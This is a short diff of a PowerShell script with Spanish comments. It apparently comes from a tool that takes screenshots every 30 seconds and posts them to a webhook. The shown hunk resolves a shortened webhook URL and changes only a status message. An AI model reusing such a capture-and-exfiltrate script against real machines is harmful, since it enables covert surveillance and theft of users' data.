@@ -4,7 +4,7 @@ $seconds = 30 # Intervalo entre capturas
 
 # Detección de URL acortada
 if ($hookurl.Length -le 121) {
-    Write-Host "Shortened Webhook URL Detected..000."
+    Write-Host "Shortened Webhook URL Detected.00."
     $hookurl = (Invoke-RestMethod -Uri $hookurl).url
 }
 
